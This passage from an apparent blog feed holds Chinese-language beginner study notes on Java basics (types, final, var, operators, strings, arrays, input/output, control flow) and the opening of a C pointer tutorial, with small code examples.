<p>所以是时候对 jar 文件来一个规范了，可以单独列出来一个 module descriptor 文件，里面规定了自己的哪些类可以被外界调用，而自身又需要哪模块的哪些些类。这样就可以将一个 jar 文件差分成很多 jmod 文件，然后需要哪些 jmod 就组合哪些，jmod 的描述文件里写有各个模块的依赖关系，所以保证功能的前提下极大的精简了体积。因为可以限制对外界开放的类，所以也大大保证了代码功能的封装性。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习笔记</title>
    <url>/2020/12/24/72c67c684b4a/</url>
    <content><![CDATA[<blockquote>
<p>安全学的真的是太菜了，所以不得已只能转了开发，emmmmm，打工人，努力去学习搬砖吧！</p>
</blockquote>
<h2 id="Java-简介"><a href="#Java-简介" class="headerlink" title="Java 简介"></a>Java 简介</h2><h3 id="编译-or-解释？Java的独特之处"><a href="#编译-or-解释？Java的独特之处" class="headerlink" title="编译 or 解释？Java的独特之处"></a>编译 or 解释？Java的独特之处</h3><p>Java 是一种介于编译性和解释性的语言，首先需要明确两个概念，编译性和解释性。</p>
<p><strong>编译性语言</strong>：在执行之前，需要使用编译器编译成可以被计算机执行机器码，然后计算机直接运行对应的机器码。这样的语言被称为编译性语言，比如 C / C++。这样好处是性能很好，但是因为不同架构的 CPU 使用的是不同的指令集，所以需要对应每一个平台都进行不同的编译才可以。</p>
<p><strong>解释性语言</strong>：在运行的时候，使用解释器将代码解释成对应的机器码，然后执行。这是一个同步的过程，解释和运行。所以写出来的代码只需要在运行的时候用对应平台的解释器来运行就可以了，所以可拓展性就很强，比如 Python ，就是解释性语言。</p>
<p><strong>编译-解释性语言</strong>：同时拥有上面两种语言的特性的Java就属于 编译-解释性 语言，Java 代码在编写出来之后，会首先经历 <strong>编译</strong>。但是这个编译并不是要生成机器码，而是生成字节码。因为机器码是高度依赖硬件的，所以为了实现良好的可移植性，Java 通过编译生成字节码来表达代码运算过程。 第二步就是 <strong>解释</strong> 了，当Java的字节码来到需要运行的平台，就轮到对应平台的解释器了上场了。Java解释器会把字节码翻译成对应平台的机器码，翻译一行就运行一行。所以Java是结合了编译和解释两种方式的语言。</p>
<h3 id="JDK-和-JRE-是什么意思？"><a href="#JDK-和-JRE-是什么意思？" class="headerlink" title="JDK 和 JRE 是什么意思？"></a>JDK 和 JRE 是什么意思？</h3><p>JDK: Java Development Kit  （Java开发套件）</p>
<p>JRE: Java Runtime Environment （Java运行环境）</p>
<p>JDK 是包括 JRE的，他们之间的关系如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ┌─    ┌──────────────────────────────────┐</span><br><span class="line"> │     │     Compiler, debugger, etc.  |</span><br><span class="line"> │     └──────────────────────────────────┘</span><br><span class="line">JDK ┌─ ┌──────────────────────────────────┐</span><br><span class="line"> │  │  │                               │</span><br><span class="line"> │ JRE │      JVM + Runtime Library    │</span><br><span class="line"> │  │  │                               │</span><br><span class="line"> └─ └─ └──────────────────────────────────┘</span><br><span class="line">       ┌────────┐┌──────┐┌───────┐┌───────┐</span><br><span class="line">       │Windows││ Linux││ macOS││others │</span><br><span class="line">       └────────┘└──────┘└───────┘└───────┘</span><br></pre></td></tr></table></figure>
<p>所以作为开发者，直接下载 JDK 就可以了。</p>
<h3 id="Java-的兄弟姐妹们"><a href="#Java-的兄弟姐妹们" class="headerlink" title="Java 的兄弟姐妹们"></a>Java 的兄弟姐妹们</h3><p>Java一共有三个不同的版本，分别是：</p>
<ul>
<li>Java SE：Standard Edition</li>
<li>Java EE：Enterprise Edition</li>
<li>Java ME：Micro Edition</li>
</ul>
<p>Java ME 原本是用来做嵌入式开发用的， 其 JVM 和 Runtime Library 被大幅度削减，但是没啥人用它。</p>
<p>Java SE 是Java的标准版，也是整个 Java 平台的核心。</p>
<p>Java EE 是Java的企业版，里面加了大量的API和库，方便开发使用。</p>
<h3 id="Java的编译器和解释器"><a href="#Java的编译器和解释器" class="headerlink" title="Java的编译器和解释器"></a>Java的编译器和解释器</h3><p>我们可以在安装的Java的 <code>./jdk/bin</code> 文件夹里面发现一些可执行文件，比如：</p>
<ul>
<li><strong>java.exe</strong> 这个东西就是 java 的 JVM（解释器），运行 java 程序的时候，就是它将程序的字节码一句一句翻译成机器码，然后一行一行执行。</li>
<li><strong>javac.exe</strong> 这个东西是 java 的编译器，它将 java 代码 (.java) 编译成 java 字节码文件 (.class)</li>
<li><strong>jar.exe</strong> 将一组 .class 的字节码文件打包成 .jar 文件，然后发布到外界（应用程序）</li>
<li><strong>javadoc.exe</strong> 用于从 java 代码中提取注释，然后整合成文档。</li>
<li><strong>jdb.exe</strong> 用于 java 的调试。</li>
</ul>
<p>下面就是 java 运行过程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──────────────────┐</span><br><span class="line">│    Hello.java   │&lt;─── source code</span><br><span class="line">└──────────────────┘</span><br><span class="line">          │ compile (javac.exe)</span><br><span class="line">          ▼</span><br><span class="line">┌──────────────────┐</span><br><span class="line">│   Hello.class   │&lt;─── byte code</span><br><span class="line">└──────────────────┘</span><br><span class="line">          │ execute (java.exe)</span><br><span class="line">          ▼</span><br><span class="line">┌──────────────────┐</span><br><span class="line">│    Run on JVM   │</span><br><span class="line">└──────────────────┘</span><br></pre></td></tr></table></figure>
<h2 id="Java变量"><a href="#Java变量" class="headerlink" title="Java变量"></a>Java变量</h2><h3 id="Java的基本数据类型"><a href="#Java的基本数据类型" class="headerlink" title="Java的基本数据类型"></a>Java的基本数据类型</h3><p><strong>byte</strong>：Java 比 <code>C++</code> 多了一个整形 byte 占用一个字节，可以表示 -128 到 127 的整数。</p>
<p><strong>long</strong>：等效于 <code>C++</code> 中的 long long 类型，所以只需要写一个 long 就可以了</p>
<p><strong>float</strong>: 在java中<code>float</code>类型，需要加上<code>f</code>后缀，比如<code>float Xorex=1.2f;</code> ，直接原因是 JVM 不太聪明，根本原因是浮点型的默认数据类型是double，然而 float 和 double 两种数据在内存中的存储方式是不一样的，所以需要在 float 数据后面加上 f 来标识，具体请参看博文：<a href="https://xorex.space/">内存中的基本类型数据</a></p>
<p><strong>boolean</strong>：这里和 <code>C++</code> 不太一样哦，是 <code>boolean</code> ，虽说理论上只会占用 一个字节的空间，但是JVM常常给它 四个字节，</p>
<p><strong>char</strong>：这里 char 类型占用两个字节16位，所以和 <code>C++</code> 的 char 不同的是它能表示的范围就大了很多，不仅仅是 ASCII 的那些，它最大可以表示到 65535，意味着16位 Unicode 的单字符 char 也可以保存下来。 这里 char 和 <code>C++</code> 一样，只能使用单引号 <code>&#39;&#39;</code> 来表示字符。</p>
<p>除了上面的基本类型，剩下的就只有 Java 的引用类型了，比如 String 类型。</p>
<h3 id="final-常量"><a href="#final-常量" class="headerlink" title="final 常量"></a>final 常量</h3><p>Java中有一个可以把变量表示为常量的标识符 <code>final</code> ，为什么不叫 <code>const</code> 呢，因为它真的不是一个狭义上的常量。</p>
<p>final 类型被叫作 出生即为最终的变量 比较合适，因为它被声明之后，被允许有且仅有一次的赋值，一旦拥有，那么这就是它最终的状态了。而常量，是除了初始化以外，是不允许任何赋值操作的。</p>
<p>你可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> Num;</span><br><span class="line">    Num=<span class="number">1</span>;</span><br><span class="line">    System.out.println(Num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以写成像 const  一样：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> Num=<span class="number">1</span>;</span><br><span class="line">    System.out.println(Num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="智能的-var"><a href="#智能的-var" class="headerlink" title="智能的 var"></a>智能的 var</h3><p>Java 给了一个特别的关键字 <code>var</code> 这个关键字可以自动帮你定义数据类型，就像 Python 和 PHP 一样，你不需要关心你需要定义什么样的数据类型，只管用就完事了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Xorex=<span class="string">&quot;Tempest&quot;</span>;</span><br><span class="line">  System.out.println(((Object)Xorex).getClass().toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后输出这个 Xorex 变量的类型是 String 类型，可以看出 var 智能的分配了变量所需要的类型，需要注意的是，var 的类型判断的基础是<strong>对声明的变量进行了初始化</strong>，如果不进行初始化，那么就 var 就没有办法<strong>通过初始化的数据</strong>来智能的<strong>判断</strong>变量的类型了。</p>
<p>当然我们可以自己对变量的类型进行强制转换，方法和 C语言 的相同。</p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>作用域指的是一个变量有效的区域，这个区域的划分是依靠 <code>&#123;&#125;</code> 来决定的。也就是说一个变量的声明之后，其作用域就是声明位置所在的<strong>根大括号内</strong>并且在声明位置后面的区域。</p>
<h2 id="Java计算"><a href="#Java计算" class="headerlink" title="Java计算"></a>Java计算</h2><h3 id="Java表达式计算"><a href="#Java表达式计算" class="headerlink" title="Java表达式计算"></a>Java表达式计算</h3><p>Java在计算过程中，不会对计算结果范围溢出的地方进行类型扩大，也就是说，对于下面的代码，输出结果是会溢出为负数的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">2147483640</span>;</span><br><span class="line">        <span class="keyword">int</span> y = <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">long</span> z=x+y;</span><br><span class="line">        System.out.println(z);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的类型决定  <code>z=x+y</code> 中，因为 x 和 y 都是 int 类型，所以说 x+y 的结果也是 int 型，所以就会溢出，即使接受的 z 是一个 long 类型，但是拿到的也仅仅是已经溢出的数据。所以正确的解决方案就是将 x 或 y 直接转化为 long 类型，然后再执行运算。</p>
<p>下面是Java代码在执行的时候，运算符的优先级顺序：</p>
<table>
<thead>
<tr>
<th>优先级</th>
<th>运算符</th>
<th>结合性</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>()、[]、{}</td>
<td>从左向右</td>
</tr>
<tr>
<td>2</td>
<td>!、+、-、~、++、–</td>
<td>从右向左</td>
</tr>
<tr>
<td>3</td>
<td>*、/、%</td>
<td>从左向右</td>
</tr>
<tr>
<td>4</td>
<td>+、-</td>
<td>从左向右</td>
</tr>
<tr>
<td>5</td>
<td>«、»、&gt;&gt;&gt;</td>
<td>从左向右</td>
</tr>
<tr>
<td>6</td>
<td>&lt;、&lt;=、&gt;、&gt;=、instanceof</td>
<td>从左向右</td>
</tr>
<tr>
<td>7</td>
<td>==、!=</td>
<td>从左向右</td>
</tr>
<tr>
<td>8</td>
<td>&amp;</td>
<td>从左向右</td>
</tr>
<tr>
<td>9</td>
<td>^</td>
<td>从左向右</td>
</tr>
<tr>
<td>10</td>
<td>|</td>
<td>从左向右</td>
</tr>
<tr>
<td>11</td>
<td>&amp;&amp;</td>
<td>从左向右</td>
</tr>
<tr>
<td>12</td>
<td>||</td>
<td>从左向右</td>
</tr>
<tr>
<td>13</td>
<td>?:</td>
<td>从右向左</td>
</tr>
<tr>
<td>14</td>
<td>=、+=、-=、*=、/=、&amp;=、|=、^=、~=、«=、»=、&gt;&gt;&gt;=</td>
<td>从右向左</td>
</tr>
</tbody></table>
<h3 id="短路运算"><a href="#短路运算" class="headerlink" title="短路运算"></a>短路运算</h3><p>Java也是个老懒狗了，对于双目逻辑运算 <code>&amp;&amp;</code> 和 <code>||</code> ，如果 <code>&amp;&amp;</code> 左边已经是 false 了，那么它右边的表达式就不会去计算了，对于 <code>||</code> 如果左边已经是 ture 它同样也不会计算了，这个特性被成为短路运算。</p>
<p>真的是老懒狗了，我们可以利用这个性质，把容易引发短路运算的表达式放到前面，这样可以减少运算。</p>
<h2 id="字符和字符串"><a href="#字符和字符串" class="headerlink" title="字符和字符串"></a>字符和字符串</h2><h3 id="字符char"><a href="#字符char" class="headerlink" title="字符char"></a>字符char</h3><p>char类型保存的是一个 Unicode 字符，占用两个字节，所以一个字符保存一个汉字也是没有问题的啦。char类型可以可以使用对应的 Unicode 编码来表示，一共有两种表示方法：</p>
<p><code>char ch=0x41;</code> 和 <code>char ch=&#39;A&#39;;</code> 和 <code>char ch=&#39;\u0041&#39;</code> 其中第一个可以用任意进制来表示，第三个在使用 <code>\u</code> 转码的时候只能使用十六进制，并且满足两个字节的大小。</p>
<h3 id="字符串String"><a href="#字符串String" class="headerlink" title="字符串String"></a>字符串String</h3><p>字符串类型是<strong>引用类型</strong>，所谓的引用类型，本质上就是一个类，String 变量里面保存的是字符串的地址，而不是字符串本身，所以被称为引用类型。</p>
<p>字符串之间可以直接相加，字符串和其他类型之间也可以相加减，只不过会被类型转化为字符串类型，转化方法也很直接，你看起来是啥转化之后就是啥，比如下面的代码运行结果就是 <code>Boolean is: false</code> ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> This=(<span class="number">0</span>&gt;<span class="number">1</span>);</span><br><span class="line">String That=<span class="string">&quot;Boolean is:&quot;</span>;</span><br><span class="line">System.out.println(This+That);</span><br></pre></td></tr></table></figure>
<p>当然，对于Java来说，多行字符串也不是问题，使用和 Python 相同的处理方法:<code>&quot;&quot;&quot;@#$%()&amp;&quot;&quot;&quot;</code>  三个双引号里面可以想搞什么就搞什么。</p>
<h2 id="Java的数组"><a href="#Java的数组" class="headerlink" title="Java的数组"></a>Java的数组</h2><h3 id="数组声明"><a href="#数组声明" class="headerlink" title="数组声明"></a>数组声明</h3><p>数组在Java中也是一个引用类型。</p>
<p>比如整形数组的声明方式： <code>int[] a=new int[1001];</code></p>
<p>比如字符数组的声明方式：<code>char[] ch=new char[1001];</code></p>
<p>当然也可以在声明的时候直接对数组进行初始化：</p>
<p><code>int[] a=new int[]&#123;1,2,3,4,5&#125;;</code></p>
<p>或者更简单的：</p>
<p><code>int[] a=&#123;1,2,3,4,5&#125;;</code></p>
<p>对于多维数组，其实就是套娃，直接叠加方括号就可以了 <code>[]</code> ，比如下面的：</p>
<p><code>int[][] a=new int[3][3];</code> 这就成功的声明了一个数组。</p>
<p><code>int[][] a=&#123;&#123;1,2,3&#125;,&#123;1&#125;,&#123;1,2&#125;&#125;;</code> 这样就成功的初始化了二维数组，需要注意的是，因为 Java 的数组是引用类型的，也就是说 <code>a</code> 引用的是一个一位数组，这个一位数组每个元素都引用一个一位数组，正是因为这种引用的关系，所以二位数组每一行的列数量不需要相等。（区别于C中在内存连续的数组，它需要每一行列数量相等才可以通过指针运算来访问行列的内存地址） 因为这个原因，我们因此可以初始化一个 <code>a[0][2]</code> 存在，但是 <code>a[1][2]</code> 不存在的二维数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                    ┌───┬───┬───┬───┐</span><br><span class="line">         ┌───┐  ┌──&gt;│ 1 │ 2 │ 3 │ 4 │</span><br><span class="line">a  ─────&gt;│░░░│──┘   └───┴───┴───┴───┘</span><br><span class="line">         ├───┤      ┌───┬───┐</span><br><span class="line">         │░░░│─────&gt;│ 5 │ 6 │</span><br><span class="line">         ├───┤      └───┴───┘</span><br><span class="line">         │░░░│──┐   ┌───┬───┬───┐</span><br><span class="line">         └───┘  └──&gt;│ 7 │ 8 │ 9 │</span><br><span class="line">                    └───┴───┴───┘</span><br></pre></td></tr></table></figure>
<h3 id="字符串数组"><a href="#字符串数组" class="headerlink" title="字符串数组"></a>字符串数组</h3><p>字符串数组故名思意，就是里面指向了很多个不同的字符串的集合。</p>
<p><code>String[] a=new String[1001];</code> 或者 <code>String[] a=&#123;&quot;cat&quot;,&quot;dog&quot;,&quot;pig&quot;&#125;;</code></p>
<p>你可以对单独的一个元素进行改变  <code>a[2]=&quot;pigs&quot;;</code></p>
<h2 id="Java的输入输出"><a href="#Java的输入输出" class="headerlink" title="Java的输入输出"></a>Java的输入输出</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p><code>print()</code> 普通的直接输出里面的内容。</p>
<p><code>println()</code> print line 输出后换行，其他和普通输出相同。</p>
<p><code>printf()</code> print format 标准化输出，使用方法和C语言的相同。</p>
<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>Java的输入要麻烦的很多，如果像输出一样直接用 <code>System.out</code> 里面的 <code>print()</code> 函数家族类似的 <code>System.in</code> 输入的话，的确是可以的，但是会非常麻烦，这里使用的是一种简化的方法：</p>
<p>首先需要导入 java.util 下面的 Scanner 类，然后创建一个实例 scanner 并将 <code>System.in</code> 导入。这样实例 scanner 就可以读入不同类型的数据了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner scanner= <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n=scanner.nextInt();</span><br><span class="line">        System.out.print(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 Scanner 类中有很多读入不同类型数据的方法，next()是根据空格换行来分割读取字符，和 scanf 效果类似，但是返回的数据全都是 String 类型。nextLine() 读入一整行的数据并将其返回为 String 数据。当然我们可以读入其他类型的数据，只需要使用比如：nextInt() , nextDouble() 就可以了。</p>
<p>需要注意的是，这里面是<strong>没有nextChar()</strong> 方法的！因为读入是以空格作为分隔符，所以会有一些歧义。比如C语言的 <code>scanf()</code>就没有办法读入一个空格字符，所以可能是这个原因使得没有 nextChar() 方法。</p>
<p>这里可以使用 next() 方法来读取一个字符串，然后分割成字符。或者使用 <code>System.in.read()</code>  ，下面是后者的使用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> a=(<span class="keyword">char</span>)System.in.read();</span><br><span class="line">        System.out.print(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先需要导入IO异常处理  <code>java.io.IOException</code> 然后在 main 方法后面加上 <code>throws Exception</code> 表示这个方法可能会抛出异常，如果有异常则交给调用方处理。（这里IO异常时必须要加上的，不然编译会报错）</p>
<p>然后就可以使用 read() 方法了，注意的时这个 read() 是从缓冲区里面读取 <strong>一个字节</strong> 的字符，然后返回这个字节的 ASCII 的 int 数值，所以如果要使用 <code>System.in.read()</code> 来读取字符的话，一定要强制类型转化。</p>
<h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><p>这里不太一样的是当判断引用类型的数据的时候，相等的原则不是内容相等，而是引用对象相等，比如下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">String b=<span class="string">&quot;Hello&quot;</span>.toLowerCase();</span><br><span class="line"><span class="keyword">if</span>(a==b) System.out.print(<span class="string">&quot;True&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> System.out.print(<span class="string">&quot;False&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>结果输出的就是 False，虽然 a 和 b 引用的对象内容都是 hello ，但是并不是真正的同一个 hello，JVM的引用对象分配机制以后还会讨论的。</p>
<p>但是如果我们真的有需要判断引用的两个内容是不是相等的呢，这里就可以使用函数 <code>equals()</code>  ，上面代码在判断 <code>a==b</code> 的地方替换成 <code>a.equals(b)</code> ，如果引用的两个内容相等，那么就会返回 True ! 但是需要保证的是 a 的值不能是 null ，否则就会报错 <code>NullPointerException</code></p>
<h3 id="switch-case-语句"><a href="#switch-case-语句" class="headerlink" title="switch case 语句"></a>switch case 语句</h3><p>Java的 switch case 语句用法和 C语言 的一模一样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(option)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>swtich case 语句可以判断 字符串匹配，但是和 if 语句不同的是，这里判断的是内容相等而不是引用相等。</p>
<p>在 java12 的版本中，对 switch case 语句进行了改进，没有了穿透效应，但是语法有一些小小的改变，使用 <code>-&gt;</code> 代替 <code>:</code> ，取消了 <code>break</code> ，如果要在 case 里面写多条语句的话需要加上大括号。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span>(name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Xorex&quot;</span> -&gt; System.out.print(<span class="string">&quot;You are admin!&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Tempest&quot;</span> -&gt; System.out.print(<span class="string">&quot;You are admin!&quot;</span>);</span><br><span class="line">    <span class="keyword">default</span> -&gt; </span><br><span class="line">    &#123;</span><br><span class="line">        String answer=<span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        System.out.print(<span class="string">&quot;You are a &quot;</span>+answer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="for-each-语句"><a href="#for-each-语句" class="headerlink" title="for each 语句"></a>for each 语句</h3><p>如果我们想要遍历一个数组里面的元组，想要直接获得里面的东西，可以使用 for each 语句，语法大概是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> element : array) System.out.println(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没错，写法就是 <code>for(int element : array)</code> 这个遍历顺序是按照数组的元素下标进行遍历的。也就是说这个循环等效于下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> element=array[i];</span><br><span class="line">        System.out.println(element);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="main-参数"><a href="#main-参数" class="headerlink" title="main 参数"></a>main 参数</h3><p>你可能会很好奇，为啥 main 函数里面要有参数 <code>String[] args</code> ，这个东西其实和C语言的 <code>char **args</code> 是一样的，用来传入命令行的参数。不过不同的是 Java 里面 main 函数是必须要写这个参数的，不然会报错，但是C语言可以不写。</p>
<p>这个叫 args 的 String 数组会把输入的命令保存下来，然后在程序中进行处理。</p>
<p>Java 的基础内容的学习笔记大概就是这样了，下面就是 Java 的灵魂</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言指针初探</title>
    <url>/2020/11/25/b1fae2529bd1/</url>
    <content><![CDATA[<h2 id="取地址运算"><a href="#取地址运算" class="headerlink" title="取地址运算"></a>取地址运算</h2><p>使用取地址符号 <code>&amp;</code> 来获取一个变量的地址。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,&amp;a);</span><br><span class="line"><span class="comment">// 结果输出 60fe9c 表示变量a的地址</span></span><br></pre></td></tr></table></figure>
<h2 id="指针的声明"><a href="#指针的声明" class="headerlink" title="指针的声明"></a>指针的声明</h2><p>在声明指针变量的时候，变量名前加 <code>*</code> 表示为指针变量，可以写多个 <code>*</code> 来表示多重指针。</p>
<p>对指针变量进行赋值的时候，是给指针变量一个地址，所以需要使用 <code>&amp;</code> 操作符。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a,*p1,**p2;</span><br><span class="line">p1=&amp;a;</span><br><span class="line">P2=&amp;p1;</span><br></pre></td></tr></table></figure>
<p>上面代码表示，声明一个整形变量 a，声明一个整形指针变量 p1，声明一个二重整形指针指针。</p>
<p>指针的套娃要严格地按照有多少个星号，一个多重指针只能接受来自比他少一个星号的指针的地址。</p>
<h2 id="指针变量的引用"><a href="#指针变量的引用" class="headerlink" title="指针变量的引用"></a>指针变量的引用</h2><p>指针变量使用 <code>*</code> 来访问其保存的内存地址里面的数据，修改 <code>*p</code> 会直接修改内存里面的数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a,*p1,**p2;</span><br><span class="line">p1=&amp;a;</span><br><span class="line">p2=&amp;p1;</span><br><span class="line">**p2=<span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line"><span class="comment">// 输出结果是 3</span></span><br></pre></td></tr></table></figure>
<h2 id="malloc内存分配"><a href="#malloc内存分配" class="headerlink" title="malloc内存分配"></a>malloc内存分配</h2><p>首先使用之前需要声明库：<code>stdlib.h</code>  </p>
<p>malloc() 函数的原型是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">malloc</span> <span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
<p>它在执行时，需要输入一个申请空间大小（为字节大小），然后返回一个内存地址，这个内存地址为 void * 类型，也就是不确定的指针类型，所以我们一般在给指针用 malloc() 函数分配一个地址的时候一般会强制类型转换为对应的指针类型，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *P=(<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span> *));</span><br></pre></td></tr></table></figure>
<p>这样就在内存中申请了一个整形大小的空间，然后将返回的内存地址强制转化为整形指针类型，然后给指针 P 初始化。</p>
<h2 id="指针变量作为函数参数"><a href="#指针变量作为函数参数" class="headerlink" title="指针变量作为函数参数"></a>指针变量作为函数参数</h2><p>函数参数里面也可以放置指针参数，实际上传参的时候，传入的是一个地址：</p>
